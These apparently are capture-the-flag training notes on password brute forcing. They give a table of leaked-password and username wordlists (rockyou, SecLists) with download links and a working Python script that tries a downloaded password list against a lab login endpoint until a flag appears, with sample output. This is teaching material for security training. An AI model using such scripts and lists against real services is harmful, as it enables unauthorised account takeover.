## Building and Utilizing Wordlists
|Wordlist|Description|Typical Use|Source|
|---|---|---|---|
|`rockyou.txt`|A popular password wordlist containing millions of passwords leaked from the RockYou breach.|Commonly used for password brute force attacks.|[RockYou breach dataset](https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt)|
|`top-usernames-shortlist.txt`|A concise list of the most common usernames.|Suitable for quick brute force username attempts.|[SecLists](https://github.com/danielmiessler/SecLists/blob/master/Usernames/top-usernames-shortlist.txt)|
|`xato-net-10-million-usernames.txt`|A more extensive list of 10 million usernames.|Used for thorough username brute forcing.|[SecLists](https://github.com/danielmiessler/SecLists/blob/master/Usernames/xato-net-10-million-usernames.txt)|
|`2023-200_most_used_passwords.txt`|A list of the 200 most commonly used passwords as of 2023.|Effective for targeting commonly reused passwords.|[SecLists](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/2023-200_most_used_passwords.txt)|
|`Default-Credentials/default-passwords.txt`|A list of default usernames and passwords commonly used in routers, software, and other devices.|Ideal for trying default credentials.|[SecLists](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/default-passwords.txt)|
## Throwing a dictionary at the problem

Python script below as `dictionary-solver.py`

```python
import requests

ip = "127.0.0.1" # Change this to your instance IP address 
port = 1234 # Change this to your instance port number

# Download a list of common passwords from the web and split it into lines 
passwords=requests.get("https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/500-worst-passwords.txt").text.splitlines()

# Try each password from the list 
for password in passwords: 
	print(f"Attempted password: {password}") 

	# Send a POST request to the server with the password 
	response = requests.post(f"http://{ip}:{port}/dictionary", data={'password': password}) 
	
	# Check if the server responds with success and contains the 'flag' 
	if response.ok and 'flag' in response.json(): 
		print(f"Correct password found: {password}") 
		print(f"Flag: {response.json()['flag']}") 
		break
```

```shell
3kjS@htb[/htb]$ python3 dictionary-solver.py ... 

Attempted password: turtle 
Attempted password: tiffany 
Attempted password: golf 
Attempted password: bear 
Attempted password: tiger 
Correct password found: ... 
Flag: HTB{...}
```
